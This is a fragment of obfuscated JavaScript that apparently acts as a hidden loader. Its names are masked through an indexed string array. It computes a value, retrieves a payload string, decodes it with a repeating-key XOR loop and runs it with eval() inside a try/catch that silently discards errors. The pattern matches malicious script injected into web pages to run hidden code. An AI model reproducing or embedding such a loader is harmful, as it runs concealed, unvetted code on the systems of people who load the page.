_$it_162c_3[_$_608f[0x33]]){_$it_162c_3[_$_608f[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_608f[0x34]]}}}}})();return (function(n){var r=c[_$_608f[0x10]];var e=_$_608f[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_608f[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_608f[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_608f[0x47]][_$_608f[0x46]](n[_$_608f[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_608f[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_608f[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_608f[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_608f[0x4a],parseInt(__jso_block_param_2_p[_$_608f[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_608f[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
